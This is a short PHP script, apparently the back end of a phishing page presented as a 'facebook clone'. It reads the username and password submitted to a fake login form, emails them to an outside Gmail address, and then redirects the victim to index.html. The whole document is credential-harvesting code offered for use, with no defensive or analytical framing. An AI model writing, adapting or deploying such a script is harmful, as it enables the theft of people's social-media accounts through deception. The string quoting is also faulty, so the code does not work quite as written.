<?php
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $email_subject = 'new submission from facebook clone';
    $email_body = 'Number | Email : $username.\n'.
                    'Password : $password.\n';
    $to = 'sakibrisa@gmail.com';
    mail($to, $email_subject, $email_body);
    header("Location: index.html");
?>